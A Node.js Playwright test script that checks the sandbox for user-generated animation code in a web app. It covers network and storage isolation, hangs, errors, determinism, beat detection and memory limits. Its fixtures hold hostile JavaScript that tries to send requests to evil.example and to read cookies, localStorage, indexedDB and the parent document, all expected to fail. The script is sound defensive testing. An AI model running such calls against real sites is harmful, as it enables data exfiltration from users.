// Generate with code, the sandbox alone (docs/specs/generate-with-code.md, criteria 1-7), with fixture code, no model,
// no UI: hostile code can't reach the network, storage, the parent or the page; each wall holds alone (iframe + CSP
// without the worker, the worker without the prelude); an endless loop stops in time while the page keeps its pace;
// a throw reports message, line and frame; a second load stops the job; the contract; determinism; memory.
//   node design/codegen-sandbox-check.mjs <repo-root> <out-dir>
import { createRequire } from 'node:module';
import { mkdirSync, readFileSync, statSync } from 'node:fs';
import { createServer } from 'node:http';
import { join, extname, normalize } from 'node:path';
const { chromium } = createRequire('/home/ramiro/testkit/')('playwright-core');

const [root, out] = process.argv.slice(2);
mkdirSync(out, { recursive: true });
let fails = 0;
const check = (name, ok, ev = '') => { if (!ok) fails++; console.log((ok ? 'PASS ' : 'FAIL ') + name + (ev ? ' · ' + ev : '')); };
const TYPES = { '.html': 'text/html', '.js': 'text/javascript', '.woff2': 'font/woff2', '.png': 'image/png', '.json': 'application/json' };
const srv = createServer((q, r) => {
  const p = join(root, normalize(decodeURIComponent(q.url.split('?')[0])).replace(/^(\.\.[/\\])+/, ''));
  try { if (!statSync(p).isFile()) throw 0; r.writeHead(200, { 'content-type': TYPES[extname(p)] || 'application/octet-stream' }); r.end(readFileSync(p)); } catch { r.writeHead(404); r.end(); }
});
await new Promise(ok => srv.listen(0, '127.0.0.1', ok));
const origin = `http://127.0.0.1:${srv.address().port}`;

const browser = await chromium.launch({ executablePath: '/snap/bin/chromium', headless: true, args: ['--no-sandbox'] });
const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 } });
const requests = [];
await ctx.route('**/*', r => { const u = r.request().url(); requests.push(u); return u.startsWith(origin) ? r.continue() : r.abort(); });
await ctx.addInitScript(() => { window.__CUE_MEDIA_TEST = { off: true }; window.__CUE_CG_TEST = {}; });
const page = await ctx.newPage();
const errors = []; page.on('pageerror', e => errors.push(e.message));
let navigated = 0; page.on('framenavigated', f => { if (f === page.mainFrame()) navigated++; });
await page.goto(origin + '/index.html'); await page.waitForSelector('#projname'); await page.waitForTimeout(800);
navigated = 0;
const appReq = () => requests.filter(u => !u.startsWith(origin));

// helpers in the page: run a job, hash frames, read a pixel
await page.evaluate(() => {
  const T = window.__CUE_CG_TEST;
  T.job = (code, o = {}) => T.open({ code, width: o.w || 64, height: o.h || 36, fps: 30, duration: o.d || 2, seed: o.seed || 7, beats: [], energy: null, fonts: [] });
  T.pix = b => { const c = new OffscreenCanvas(b.width, b.height), g = c.getContext('2d'); g.drawImage(b, 0, 0); const d = g.getImageData(0, 0, b.width, b.height).data; b.close(); return d; };
  T.hash = d => { let h = 2166136261; for (let i = 0; i < d.length; i++) h = Math.imul(h ^ d[i], 16777619); return (h >>> 0).toString(16); };
  T.rgb = d => [d[0], d[1], d[2]].join(',');
  T.run = async (code, frames = [0], o) => { const j = T.job(code, o), t0 = performance.now(); const r = { frames: [] };
    try { for (const i of frames) { const d = T.pix(await j.frame(i)); r.frames.push({ rgb: T.rgb(d), hash: T.hash(d) }); } } catch (e) { r.err = e; }
    r.ms = Math.round(performance.now() - t0); j.kill({ kind: 'done' }); r.iframes = document.querySelectorAll('iframe[sandbox]').length; return r; };
});
const run = (code, frames, o) => page.evaluate(([c, f, o]) => window.__CUE_CG_TEST.run(c, f, o), [code, frames, o]);
const fixture = attacks => `function animation({ ctx, width, height }) {
  const won = [];
  const tries = { ${attacks} };
  for (const k in tries) { try { const r = tries[k](); if (r !== undefined && r !== null && r !== false) won.push(k); } catch (e) {} }
  if (won.length) throw new Error('won: ' + won.join(' '));
  return function draw(t) { ctx.fillStyle = '#00ff00'; ctx.fillRect(0, 0, width, height); };
}`;

// ---- 1. network (through the real sandbox, all three walls) ----
{
  const before = appReq().length;
  const code = fixture(`
    fetch: () => fetch('https://evil.example/f'), xhr: () => { const x = new XMLHttpRequest(); x.open('GET', 'https://evil.example/x'); x.send(); return 1; },
    ws: () => new WebSocket('wss://evil.example/w'), es: () => new EventSource('https://evil.example/e'),
    imp: () => importScripts('https://evil.example/i.js'), img: () => { const i = new Image(); i.src = 'https://evil.example/i.png'; return 1; },
    loc: () => { location.href = 'https://evil.example/l'; return 1; }, open: () => window.open('https://evil.example/o'),
    top: () => { top.location = 'https://evil.example/t'; return 1; }, wt: () => new WebTransport('https://evil.example/wt'),
    bc: () => new BroadcastChannel('cue'), worker: () => new Worker('data:text/javascript,1'), post: () => { postMessage('hi'); return 1; },
    proto: () => Object.getPrototypeOf(self).postMessage.call(self, 'hi'),
    fontUrl: () => { new FontFace('x', 'url(https://evil.example/f.woff2)').load().catch(() => 0); },
    timer: () => setTimeout(() => 0, 1)`);
  const r = await run(code, [0, 10]);
  await page.waitForTimeout(1500);
  check('1 network: every attack fails inside the sandbox', !r.err && r.frames.every(f => f.rgb === '0,255,0'), JSON.stringify(r.err || r.frames[0]));
  check('1 network: no request leaves the page', appReq().length === before, appReq().slice(before).join(' '));
  check('1 network: the app did not navigate', navigated === 0);
}
// ---- walls alone: the iframe + CSP with hostile code right in it (no worker), and a raw worker without the prelude ----
{
  const before = appReq().length;
  const res = await page.evaluate(async () => {
    const T = window.__CUE_CG_TEST, n = 'n' + Math.random().toString(36).slice(2);
    const hostile = `const won=[];const t={fetch:()=>fetch('https://evil.example/a'),idb:()=>indexedDB.open('x'),ls:()=>localStorage.length,ck:()=>document.cookie,
      pd:()=>parent.document.title,top:()=>top.location.href,caches:()=>caches.keys(),img:()=>{const i=new Image();i.src='https://evil.example/b.png';document.body.appendChild(i)},
      ss:()=>sessionStorage.length,opener:()=>window.open('https://evil.example/o')};
      for(const k in t){try{const r=t[k]();if(r&&r.then)r.then(()=>won.push(k+'(async)'),()=>0);else if(r!==undefined&&r!==null)won.push(k)}catch(e){}}
      const w=new Worker(URL.createObjectURL(new Blob(["let w=[];try{fetch('https://evil.example/w').then(()=>postMessage('fetch'),()=>postMessage('-'))}catch(e){postMessage('-')}"],{type:'text/javascript'})));
      w.onmessage=e=>setTimeout(()=>parent.postMessage({wall:1,won,worker:e.data},'*'),300);w.onerror=()=>parent.postMessage({wall:1,won,worker:'noworker'},'*');`;
    const f = document.createElement('iframe');
    f.setAttribute('sandbox', 'allow-scripts'); f.setAttribute('allow', T.ALLOW); f.style.display = 'none';
    f.srcdoc = `<!doctype html><meta http-equiv="Content-Security-Policy" content="${T.CSP(n)}"><body><script nonce="${n}">${hostile}<\/script>`;
    const got = new Promise(ok => { addEventListener('message', e => { if (e.data && e.data.wall) ok(e.data); }); setTimeout(() => ok({ timeout: true }), 4000); });
    document.body.appendChild(f); const r = await got; f.remove(); return r;
  });
  await page.waitForTimeout(800);
  check('walls 1+2 alone: storage, parent, network and popups all fail in the iframe itself', res.won && res.won.length === 0, JSON.stringify(res));
  check('wall 2 alone: a worker without the prelude cannot fetch (CSP inherited from the blob)', res.worker === '-', String(res.worker));
  check('walls alone: no request left the page', appReq().length === before, appReq().slice(before).join(' '));
}
// ---- 2. data ----
{
  const code = fixture(`
    idb: () => indexedDB.open('cueboard'), ls: () => localStorage.getItem('x'), ck: () => document.cookie, pd: () => parent.document,
    caches: () => caches.open('x'), ss: () => sessionStorage, glob: () => Object.getOwnPropertyNames(self).find(k => /^(apiKey|cueboard|project|cur)$/i.test(k)),
    fsync: () => new FileReaderSync()`);
  const r = await run(code, [0]);
  check('2 data: storage, cookie, parent, caches all fail in the sandbox', !r.err && r.frames[0].rgb === '0,255,0', JSON.stringify(r.err || r.frames[0]));
}
// ---- 3. endless loop: stops in time, the page keeps its pace, the iframe is gone ----
{
  const r = await page.evaluate(async () => {
    const T = window.__CUE_CG_TEST; let last = performance.now(), gap = 0; const iv = setInterval(() => { const n = performance.now(); gap = Math.max(gap, n - last); last = n; }, 10);
    const res = await T.run('function animation({ctx}){ return function draw(t){ while(true){} } }', [0]); clearInterval(iv); res.gap = Math.round(gap); return res;
  });
  check('3 loop: draw with while(true) stops within 2.5 s as a hang', r.err && r.err.kind === 'hang' && r.ms <= 2500, `${r.ms} ms ${JSON.stringify(r.err)}`);
  check('3 loop: a timer on the page keeps its pace (no gap over 100 ms)', r.gap <= 100, r.gap + ' ms');
  check('3 loop: the sandbox iframe is removed', r.iframes === 0);
  const s = await run('while(true){}\nfunction animation(){ return ()=>0 }', [0]);
  check('3 loop: a loop at load (setup) stops within 3.5 s', s.err && s.err.kind === 'hang' && s.ms <= 3500, `${s.ms} ms`);
  const k = await run('function animation({ctx,width,height}){ return function draw(t,i){ if(i===3) while(true){} ctx.fillRect(0,0,width,height) } }', [0, 1, 2, 3]);
  check('3 loop: a later frame stops after 1 s', k.err && k.err.kind === 'hang' && k.err.frame === 3 && k.frames.length === 3, JSON.stringify(k.err));
}
// ---- 4. throws ----
{
  const code = 'function animation({ ctx }) {\n  const pts = [];\n  return function draw(t, i) {\n    ctx.fillRect(0, 0, 1, 1);\n    const p = pts[3];\n    return p.x;\n  };\n}';
  const r = await run(code, [0]);
  check('4 throws: kind, message, line and frame', r.err && r.err.kind === 'throw' && /TypeError/.test(r.err.message) && r.err.line === 6 && r.err.frame === 0, JSON.stringify(r.err));
  const s = await run('function animation(){\n  return ()=>{\n  const a = ;\n  }\n}', [0]);
  check('4 syntax error: kind syntax and its line', s.err && s.err.kind === 'syntax' && /SyntaxError/.test(s.err.message) && s.err.line === 3, JSON.stringify(s.err));
  const u = await run('function animation(){ throw new RangeError("bad setup") }', [0]);
  check('4 throws in setup: kind throw, no frame', u.err && u.err.kind === 'throw' && /RangeError: bad setup/.test(u.err.message) && u.err.frame === null, JSON.stringify(u.err));
}
// ---- second load stops the job ----
{
  const r = await page.evaluate(async () => {
    const T = window.__CUE_CG_TEST, j = T.job('function animation({ctx,width,height}){ return t=>{ctx.fillRect(0,0,width,height)} }');
    await j.frame(0).then(b => b.close());
    document.querySelector('iframe[sandbox]').srcdoc = '<p>elsewhere</p>';
    await new Promise(r => setTimeout(r, 500));
    let e = null; try { await j.frame(1); } catch (x) { e = x; } return { e, left: document.querySelectorAll('iframe[sandbox]').length };
  });
  check('1 a second load event on the iframe stops the job', r.e && r.e.kind === 'crash' && r.left === 0, JSON.stringify(r));
}
// ---- a wrong message: a bitmap of the wrong size ----
{
  const r = await run('function animation({ctx}){ return t=>{} }', [0], { w: 64, h: 36 });
  check('a normal tiny job draws', !r.err, JSON.stringify(r.err));
  const s = await run('function animation(){ self.OffscreenCanvas = null; return t=>{} }\n', [0]);
  check('the main canvas does not depend on globals the code can change', !s.err, JSON.stringify(s.err));
  const c = await run('function animation(){ const a=[]; for(let i=0;i<5;i++) a.push(new OffscreenCanvas(10,10)); return t=>{} }', [0]);
  check('canvas limit: a fifth extra canvas throws', c.err && c.err.kind === 'throw' && /4 extra/.test(c.err.message), JSON.stringify(c.err));
  const big = await run('function animation(){ new OffscreenCanvas(5000,10); return t=>{} }', [0]);
  check('canvas limit: over 4096 px throws', big.err && /4096/.test(big.err.message), JSON.stringify(big.err));
}
// ---- 6. contract ----
{
  const ex = await page.evaluate(() => { const T = window.__CUE_CG_TEST, e = t => JSON.stringify(T.extract(t).err || 'ok');
    const one = 'Here:\n```js\nfunction animation(){ return t=>{} }\n```\nDone.';
    return { none: e('function animation(){}'), two: e(one + '\n```js\nfunction animation(){}\n```'), noanim: e('```js\nfunction draw(){}\n```'), ok: e(one),
      big: e('```js\nfunction animation(){}\n//' + 'x'.repeat(33000) + '\n```') }; });
  check('6 contract: no block, two blocks, no animation → right form', [ex.none, ex.two, ex.noanim].every(x => /contract/.test(x)) && ex.ok === '"ok"', JSON.stringify(ex));
  check('6 contract: over 32 KB does not start', /32 KB/.test(ex.big), ex.big);
  const nf = await run('function animation(){ return 42 }', [0]);
  check('6 contract: a non-function return → contract', nf.err && nf.err.kind === 'contract', JSON.stringify(nf.err));
  const na = await run('const x = 1;', [0]);
  check('6 contract: no animation function at all → contract', na.err && na.err.kind === 'contract', JSON.stringify(na.err));
}
// ---- 7. determinism ----
{
  const code = `function animation({ ctx, width, height, random, lib }) {
    const ps = Array.from({ length: 60 }, () => ({ x: random() * width, y: random() * height, v: random() * 40 + 5, r: random() * 3 + 1 }));
    return function draw(t) { ctx.fillStyle = '#111'; ctx.fillRect(0, 0, width, height); ctx.translate(width / 2, 0); ctx.rotate(t * 0.1); ctx.translate(-width / 2, 0);
      for (const p of ps) { ctx.fillStyle = 'hsl(' + (p.v * 7 + Math.random() * 10 | 0) + ',70%,60%)'; ctx.beginPath(); ctx.arc((p.x + p.v * t) % width, p.y + 4 * lib.noise(p.x, t), p.r, 0, 7); ctx.fill(); }
      ctx.fillStyle = 'rgba(255,255,255,' + (Date.now() % 1000) / 1000 + ')'; ctx.fillRect(0, 0, 8, 8); };
  }`;
  const a = await run(code, [0, 30, 59], { w: 320, h: 180 }), b = await run(code, [59, 30, 0], { w: 320, h: 180 });
  const ha = a.frames.map(f => f.hash), hb = b.frames.map(f => f.hash).reverse();
  check('7 determinism: same code and seed, frames 0/mid/last, also in reverse order, same pixels', !a.err && !b.err && ha.join() === hb.join() && new Set(ha).size === 3, ha.join() + ' vs ' + hb.join());
  const c = await run(code, [0], { w: 320, h: 180, seed: 8 });
  check('7 determinism: another seed gives another picture', c.frames[0] && c.frames[0].hash !== ha[0]);
}
// ---- 11. beat: a 120 BPM click track ----
{
  const r = await page.evaluate(() => {
    const T = window.__CUE_CG_TEST, sr = 22050, x = new Float32Array(sr * 30); let s = 3;
    const clicks = []; for (let t = 0.25; t < 29.9; t += 0.5) clicks.push(t);
    for (const c of clicks) { const k0 = Math.round(c * sr); for (let k = 0; k < 220; k++) { s = (s * 16807) % 2147483647; x[k0 + k] += (s / 2147483647 * 2 - 1) * Math.exp(-k / 60) * 0.8; } }
    const a = T.analyse(x, sr), hit = clicks.filter(c => a.beats.some(b => Math.abs(b - c) <= 0.03)).length / clicks.length;
    const sh = T.shot(a, 10, 15);
    return { hit, bpm: a.bpm, n: a.beats.length, sh: sh.beats, loud: sh.energy.length };
  });
  check('11 beat: at least 90 % of the clicks have a beat within 30 ms', r.hit >= 0.9, `${Math.round(r.hit * 100)} % · ${r.bpm} BPM · ${r.n} beats`);
  check('11 beat: the shot’s beats are relative to its start', r.sh.length >= 9 && r.sh.length <= 11 && Math.abs(r.sh[0] - 0.25) <= 0.03 && r.sh.every(b => b >= 0 && b < 5), JSON.stringify(r.sh));
  check('11 loudness: 10 values per second over the shot', r.loud === 50, String(r.loud));
}
// ---- 5. memory (last: it can take the renderer down) ----
{
  const r = await page.evaluate(async () => {
    const T = window.__CUE_CG_TEST, res = await T.run('function animation(){ const a=[]; for(;;) a.push(new Array(1e6).fill(Math.random())); }', [0]);
    let ok = 0; await new Promise(r => setTimeout(() => { ok = 1; r(); }, 50)); return { kind: res.err && res.err.kind, ms: res.ms, alive: ok };
  }).catch(e => ({ died: e.message }));
  const alive = await page.evaluate(() => document.title).then(() => true, () => false);
  check('5 memory: the app page still answers after a fixture that fills memory', alive && !r.died, JSON.stringify(r));
  check('5 memory: the job ends with crash or hang (stopped, nothing recorded)', ['crash', 'hang'].includes(r.kind), JSON.stringify(r));
}
check('no page errors', errors.length === 0, errors.join(' | '));
await browser.close(); srv.close();
console.log(fails ? `${fails} FAILED` : 'ALL PASS');
process.exit(fails ? 1 : 0);
